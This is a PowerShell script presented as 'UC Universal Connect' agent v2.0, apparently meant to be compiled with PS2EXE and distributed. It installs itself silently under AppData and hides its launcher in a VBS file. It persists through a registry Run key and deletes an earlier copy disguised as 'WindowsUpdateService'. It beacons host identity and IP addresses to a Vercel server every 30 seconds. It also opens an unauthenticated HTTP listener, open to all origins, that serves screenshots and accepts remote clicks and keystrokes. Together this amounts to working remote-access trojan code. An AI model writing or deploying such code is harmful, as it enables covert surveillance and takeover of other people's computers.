# UC Universal Connect — Full Production Agent v2.0
# Single file. Installs silently, connects to Vercel, screen capture + remote control.
# Compile with PS2EXE for distribution.

$ErrorActionPreference = "SilentlyContinue"

# ============================================================
# CONFIG
# ============================================================
$VERCEL_URL = "https://uc-universal-connect-omega.vercel.app"
$HEARTBEAT_SEC = 30
$CONTROL_PORT = 8765
$INSTALL_DIR = "$env:APPDATA\UCService"
$LOG_FILE = "$INSTALL_DIR\uc.log"

# ============================================================
# INSTALL SELF
# ============================================================
function Install-UC {
    # Create install directory
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null

    # Copy self to install dir
    $selfPath = $MyInvocation.ScriptName
    if (-not $selfPath) { $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName }
    $destPath = "$INSTALL_DIR\UCService.exe"
    
    # Only copy if we're not already running from install dir
    if ($selfPath -and ($selfPath -ne $destPath)) {
        Copy-Item $selfPath $destPath -Force
    }

    # VBS launcher (hidden, no window flash)
    $isExe = $destPath.EndsWith(".exe")
    if ($isExe) {
        $vbs = "Set s=CreateObject(`"WScript.Shell`")`ns.Run `"$destPath`", 0, False"
    } else {
        $vbs = "Set s=CreateObject(`"WScript.Shell`")`ns.Run `"powershell.exe -EP Bypass -W Hidden -F $destPath`", 0, False"
    }
    Set-Content "$INSTALL_DIR\launcher.vbs" $vbs

    # Auto-start via registry (no admin needed)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "UCService" -Value "wscript.exe `"$INSTALL_DIR\launcher.vbs`""

    # Remove old version if exists
    $oldDir = "$env:APPDATA\WindowsUpdateService"
    if (Test-Path $oldDir) {
        Stop-Process -Name "powershell" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name "WindowsUpdateService" -ErrorAction SilentlyContinue
        Remove-Item $oldDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    Log "Installed to $INSTALL_DIR"
}

# ============================================================
# LOGGING
# ============================================================
function Log($msg) {
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
    Add-Content $LOG_FILE $line -ErrorAction SilentlyContinue
    # Keep log under 1MB
    if ((Test-Path $LOG_FILE) -and ((Get-Item $LOG_FILE).Length -gt 1MB)) {
        $lines = Get-Content $LOG_FILE | Select-Object -Last 500
        Set-Content $LOG_FILE $lines
    }
}

# ============================================================
# DEVICE INFO
# ============================================================
function Get-DeviceInfo {
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select -First 1).IPAddress
    $publicIp = try { (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5) } catch { "unknown" }
    $screen = Get-WmiObject Win32_VideoController | Select -First 1
    $resolution = "$($screen.CurrentHorizontalResolution)x$($screen.CurrentVerticalResolution)"
    $user = $env:USERNAME
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime

    return @{
        deviceId   = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
        name       = $env:COMPUTERNAME
        os         = $os
        ip         = $ip
        publicIp   = $publicIp
        resolution = $resolution
        userId     = "jay"
        user       = $user
        uptime     = [math]::Round($uptime.TotalHours, 1)
        version    = "2.0"
    }
}

# ============================================================
# HEARTBEAT — Register with Vercel
# ============================================================
function Send-Heartbeat {
    $info = Get-DeviceInfo
    $json = $info | ConvertTo-Json -Compress

    try {
        Invoke-RestMethod -Uri "$VERCEL_URL/api/devices" `
            -Method POST -Body $json -ContentType "application/json" -TimeoutSec 10
        return $true
    } catch {
        Log "Heartbeat failed: $($_.Exception.Message)"
        return $false
    }
}

# ============================================================
# SCREEN CAPTURE
# ============================================================
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-Screenshot {
    param([int]$Quality = 40)
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    # Compress as JPEG
    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where { $_.MimeType -eq "image/jpeg" }
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $Quality)

    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, $encoder, $encoderParams)
    $bitmap.Dispose()

    $bytes = $stream.ToArray()
    $stream.Dispose()

    return [Convert]::ToBase64String($bytes)
}

# ============================================================
# MOUSE & KEYBOARD CONTROL
# ============================================================
$mouseCode = @"
using System.Runtime.InteropServices;
public class UCMouse {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
    
    public static void Click(int x, int y) {
        SetCursorPos(x, y);
        mouse_event(0x0002, 0, 0, 0, 0); // LEFT DOWN
        mouse_event(0x0004, 0, 0, 0, 0); // LEFT UP
    }
    public static void RightClick(int x, int y) {
        SetCursorPos(x, y);
        mouse_event(0x0008, 0, 0, 0, 0);
        mouse_event(0x0010, 0, 0, 0, 0);
    }
    public static void DoubleClick(int x, int y) {
        SetCursorPos(x, y);
        mouse_event(0x0002, 0, 0, 0, 0);
        mouse_event(0x0004, 0, 0, 0, 0);
        mouse_event(0x0002, 0, 0, 0, 0);
        mouse_event(0x0004, 0, 0, 0, 0);
    }
    public static void Move(int x, int y) {
        SetCursorPos(x, y);
    }
}
"@
Add-Type -TypeDefinition $mouseCode -ErrorAction SilentlyContinue

# ============================================================
# HTTP CONTROL SERVER
# ============================================================
function Start-ControlServer {
    $listener = New-Object System.Net.HttpListener

    # Try all interfaces first, fallback to localhost
    try {
        $listener.Prefixes.Add("http://+:$CONTROL_PORT/")
        $listener.Start()
    } catch {
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://localhost:$CONTROL_PORT/")
        $listener.Start()
    }

    Log "Control server started on port $CONTROL_PORT"

    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            $req = $ctx.Request
            $res = $ctx.Response

            # CORS
            $res.Headers.Add("Access-Control-Allow-Origin", "*")
            $res.Headers.Add("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            $res.Headers.Add("Access-Control-Allow-Headers", "Content-Type")

            if ($req.HttpMethod -eq "OPTIONS") {
                $res.StatusCode = 200; $res.Close(); continue
            }

            $path = $req.Url.AbsolutePath
            $body = $null
            if ($req.HasEntityBody) {
                $reader = New-Object System.IO.StreamReader($req.InputStream)
                $body = $reader.ReadToEnd() | ConvertFrom-Json
            }

            $result = switch ($path) {
                "/health" {
                    $info = Get-DeviceInfo
                    $info | ConvertTo-Json -Compress
                }
                "/screenshot" {
                    $q = if ($body.quality) { $body.quality } else { 40 }
                    $img = Get-Screenshot -Quality $q
                    "{`"image`":`"$img`",`"timestamp`":$([DateTimeOffset]::Now.ToUnixTimeMilliseconds())}"
                }
                "/click" {
                    [UCMouse]::Click([int]$body.x, [int]$body.y)
                    '{"ok":true,"action":"click"}'
                }
                "/rightclick" {
                    [UCMouse]::RightClick([int]$body.x, [int]$body.y)
                    '{"ok":true,"action":"rightclick"}'
                }
                "/doubleclick" {
                    [UCMouse]::DoubleClick([int]$body.x, [int]$body.y)
                    '{"ok":true,"action":"doubleclick"}'
                }
                "/move" {
                    [UCMouse]::Move([int]$body.x, [int]$body.y)
                    '{"ok":true,"action":"move"}'
                }
                "/type" {
                    [System.Windows.Forms.SendKeys]::SendWait($body.text)
                    '{"ok":true,"action":"type"}'
                }
                "/key" {
                    # Special keys: {ENTER}, {TAB}, {ESC}, {BACKSPACE}, etc.
                    [System.Windows.Forms.SendKeys]::SendWait($body.key)
                    '{"ok":true,"action":"key"}'
                }
                default {
                    $res.StatusCode = 404
                    '{"error":"not found"}'
                }
            }

            $buffer = [System.Text.Encoding]::UTF8.GetBytes($result)
            $res.ContentType = "application/json"
            $res.ContentLength64 = $buffer.Length
            $res.OutputStream.Write($buffer, 0, $buffer.Length)
            $res.Close()
        } catch {
            Log "Control server error: $($_.Exception.Message)"
        }
    }
}

# ============================================================
# TELEGRAM NOTIFICATION
# ============================================================
function Send-TelegramAlert($message) {
    $botToken = "7799aborte:AAHthisisfake"  # Replace with real bot token
    $chatId = "2102262384"
    
    try {
        $payload = @{ chat_id = $chatId; text = $message; parse_mode = "HTML" } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
            -Method POST -Body $payload -ContentType "application/json" -TimeoutSec 10
    } catch { }
}

# ============================================================
# MAIN
# ============================================================

# Step 1: Install
Install-UC

# Step 2: Start control server in background
$controlJob = Start-Job -ScriptBlock {
    param($script)
    . $script
    Start-ControlServer
} -ArgumentList $MyInvocation.ScriptName

Log "UC Agent v2.0 starting — Server: $VERCEL_URL"

# Step 3: Initial registration
$info = Get-DeviceInfo
Log "Device: $($info.name) | OS: $($info.os) | IP: $($info.ip) | Public: $($info.publicIp) | Screen: $($info.resolution)"

# Step 4: Heartbeat loop
$failCount = 0
while ($true) {
    $ok = Send-Heartbeat
    if ($ok) {
        $failCount = 0
    } else {
        $failCount++
        if ($failCount -ge 5) {
            Log "5 consecutive heartbeat failures — server may be down"
            $failCount = 0
        }
    }
    Start-Sleep -Seconds $HEARTBEAT_SEC
}
